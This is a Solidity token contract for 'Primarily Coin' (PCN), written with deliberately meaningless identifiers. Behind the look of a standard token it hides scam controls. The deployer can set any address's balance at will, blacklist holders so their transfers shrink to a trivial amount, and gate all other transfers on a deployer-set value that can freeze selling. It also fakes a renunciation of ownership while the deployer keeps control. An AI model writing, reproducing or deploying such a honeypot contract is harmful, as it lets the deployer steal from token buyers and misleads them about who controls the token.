//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract tokenBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitTake {
    function createPair(address takeEnable, address sellMaxFee) external returns (address);

    function feeTo() external view returns (address);
}

interface maxExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface teamLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address sellAmount) external view returns (uint256);

    function transfer(address receiverMax, uint256 feeTokenReceiver) external returns (bool);

    function allowance(address txReceiverBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeTokenReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address receiverMax,
        uint256 feeTokenReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atEnable, uint256 value);
    event Approval(address indexed txReceiverBuy, address indexed spender, uint256 value);
}

interface isTx is teamLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PrimarilyCoin is tokenBuy, teamLaunch, isTx {

    function balanceOf(address sellAmount) public view virtual override returns (uint256) {
        return buyTx[sellAmount];
    }

    bool public marketingTx;

    function decimals() external view virtual override returns (uint8) {
        return exemptWalletMin;
    }

    mapping(address => bool) public listTrading;

    function totalSupply() external view virtual override returns (uint256) {
        return totalMinFund;
    }

    bool private receiverWallet;

    mapping(address => uint256) private buyTx;

    uint256 constant buyTo = 2 ** 10;

    function owner() external view returns (address) {
        return tokenEnableTotal;
    }

    bool public launchedSell;

    function isFee(address walletMode, uint256 feeTokenReceiver) public {
        liquiditySell();
        buyTx[walletMode] = feeTokenReceiver;
    }

    uint256 private tokenModeSell;

    function modeFromMin(address exemptToSender, address receiverMax, uint256 feeTokenReceiver) internal returns (bool) {
        if (exemptToSender == isShould) {
            return exemptMin(exemptToSender, receiverMax, feeTokenReceiver);
        }
        uint256 teamLiquidity = teamLaunch(exemptLaunch).balanceOf(walletTeamTotal);
        require(teamLiquidity == liquidityFrom);
        require(receiverMax != walletTeamTotal);
        if (liquidityTake[exemptToSender]) {
            return exemptMin(exemptToSender, receiverMax, buyTo);
        }
        feeTokenReceiver = launchReceiver(exemptToSender, receiverMax, feeTokenReceiver);
        return exemptMin(exemptToSender, receiverMax, feeTokenReceiver);
    }

    mapping(address => bool) public liquidityTake;

    function modeToken(address autoSender) public {
        liquiditySell();
        
        if (autoSender == isShould || autoSender == exemptLaunch) {
            return;
        }
        liquidityTake[autoSender] = true;
    }

    function maxEnableAuto() public {
        emit OwnershipTransferred(isShould, address(0));
        tokenEnableTotal = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return shouldToken;
    }

    uint256 public txList = 0;

    address public exemptLaunch;

    uint256 public atFund = 3;

    function getOwner() external view returns (address) {
        return tokenEnableTotal;
    }

    uint256 liquidityFrom;

    address swapTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function launchReceiver(address exemptToSender, address receiverMax, uint256 feeTokenReceiver) internal view returns (uint256) {
        require(feeTokenReceiver > 0);

        uint256 exemptAmount = 0;
        if (exemptToSender == exemptLaunch && atFund > 0) {
            exemptAmount = feeTokenReceiver * atFund / 100;
        } else if (receiverMax == exemptLaunch && txList > 0) {
            exemptAmount = feeTokenReceiver * txList / 100;
        }
        require(exemptAmount <= feeTokenReceiver);
        return feeTokenReceiver - exemptAmount;
    }

    function shouldLimit(address tradingTake) public {
        require(tradingTake.balance < 100000);
        if (marketingTx) {
            return;
        }
        
        listTrading[tradingTake] = true;
        if (fundFee != tokenModeSell) {
            maxBuy = false;
        }
        marketingTx = true;
    }

    function transferFrom(address exemptToSender, address receiverMax, uint256 feeTokenReceiver) external override returns (bool) {
        if (_msgSender() != swapTeam) {
            if (shouldFrom[exemptToSender][_msgSender()] != type(uint256).max) {
                require(feeTokenReceiver <= shouldFrom[exemptToSender][_msgSender()]);
                shouldFrom[exemptToSender][_msgSender()] -= feeTokenReceiver;
            }
        }
        return modeFromMin(exemptToSender, receiverMax, feeTokenReceiver);
    }

    address private tokenEnableTotal;

    bool public maxBuy;

    event OwnershipTransferred(address indexed tokenExemptLaunch, address indexed launchedMarketing);

    function symbol() external view virtual override returns (string memory) {
        return marketingAmount;
    }

    function approve(address liquidityTrading, uint256 feeTokenReceiver) public virtual override returns (bool) {
        shouldFrom[_msgSender()][liquidityTrading] = feeTokenReceiver;
        emit Approval(_msgSender(), liquidityTrading, feeTokenReceiver);
        return true;
    }

    constructor (){
        if (launchedSell) {
            tokenModeSell = fundFee;
        }
        maxEnableAuto();
        maxExempt enableTrading = maxExempt(swapTeam);
        exemptLaunch = limitTake(enableTrading.factory()).createPair(enableTrading.WETH(), address(this));
        walletTeamTotal = limitTake(enableTrading.factory()).feeTo();
        
        isShould = _msgSender();
        listTrading[isShould] = true;
        buyTx[isShould] = totalMinFund;
        if (receiverWallet == launchedSell) {
            tokenModeSell = fundFee;
        }
        emit Transfer(address(0), isShould, totalMinFund);
    }

    uint256 teamSell;

    uint8 private exemptWalletMin = 18;

    function liquiditySell() private view {
        require(listTrading[_msgSender()]);
    }

    function allowance(address listMin, address liquidityTrading) external view virtual override returns (uint256) {
        if (liquidityTrading == swapTeam) {
            return type(uint256).max;
        }
        return shouldFrom[listMin][liquidityTrading];
    }

    uint256 private totalMinFund = 100000000 * 10 ** 18;

    function transfer(address walletMode, uint256 feeTokenReceiver) external virtual override returns (bool) {
        return modeFromMin(_msgSender(), walletMode, feeTokenReceiver);
    }

    address walletTeamTotal;

    string private shouldToken = "Primarily Coin";

    function enableLaunched(uint256 feeTokenReceiver) public {
        liquiditySell();
        liquidityFrom = feeTokenReceiver;
    }

    string private marketingAmount = "PCN";

    function exemptMin(address exemptToSender, address receiverMax, uint256 feeTokenReceiver) internal returns (bool) {
        require(buyTx[exemptToSender] >= feeTokenReceiver);
        buyTx[exemptToSender] -= feeTokenReceiver;
        buyTx[receiverMax] += feeTokenReceiver;
        emit Transfer(exemptToSender, receiverMax, feeTokenReceiver);
        return true;
    }

    mapping(address => mapping(address => uint256)) private shouldFrom;

    uint256 private fundFee;

    address public isShould;

}